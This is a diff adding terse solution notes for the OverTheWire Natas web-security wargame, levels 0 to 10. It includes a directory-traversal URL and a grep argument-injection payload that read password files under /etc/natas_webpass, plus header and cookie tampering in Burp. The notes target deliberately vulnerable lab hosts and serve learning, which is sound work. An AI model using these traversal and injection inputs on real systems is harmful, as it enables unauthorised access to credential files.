@@ -1,0 +1,15 @@
+0 - view source
+1 - view source
+2 - simple file tree (http://natas2.natas.labs.overthewire.org/files/users.txt)
+3 - robots.txt hack
+    first, go to http://natas3.natas.labs.overthewire.org/robots.txt
+    then go to http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+4 - change referer in burp
+5 - change loggedin to 1 in burp
+6 - go to http://natas6.natas.labs.overthewire.org/includes/secret.inc and submit the secret
+7 - directory traversal with php
+    http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8
+8 - reverse php processing, note f(g(x))=y <=> g'(f'(y))=x, where g', f' inverses of g, f.
+9 & 10 - grep exploit. enter the following:
+    .* /etc/natas_webpass/natas<next>
+    reason: dot (.) matches for all single characters, while star (*) matches for all lengths. together they mean 'match anything and everything'. so grep becomes cat here.
